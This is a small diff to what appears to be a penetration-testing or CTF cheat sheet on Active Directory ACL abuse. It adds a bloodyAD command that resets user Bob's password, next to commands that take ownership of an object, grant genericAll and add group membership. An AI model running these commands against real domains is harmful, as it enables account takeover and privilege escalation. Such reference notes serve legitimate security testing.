@@ -207,6 +207,7 @@ Get-ObjectAcl "DC={{DOMAIN_NB}},DC=LOCAL" -ResolveGUIDs | ? { $_.ObjectAceType -
 ```bash
 bloodyad -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' --host {{DC_IP}} set owner "MANAGEMENT" "{{USERNAME}}"
 bloodyad -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' --host {{DC_IP}} add genericAll "MANAGEMENT" "{{USERNAME}}"
+bloodyAD --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' set password Bob <New_Password>
 
 bloodyad --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' add groupMember '{{GROUP_NAME}}' {{USERNAME}}
 bloodyad --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' get object {{USERNAME}} --attr memberOf
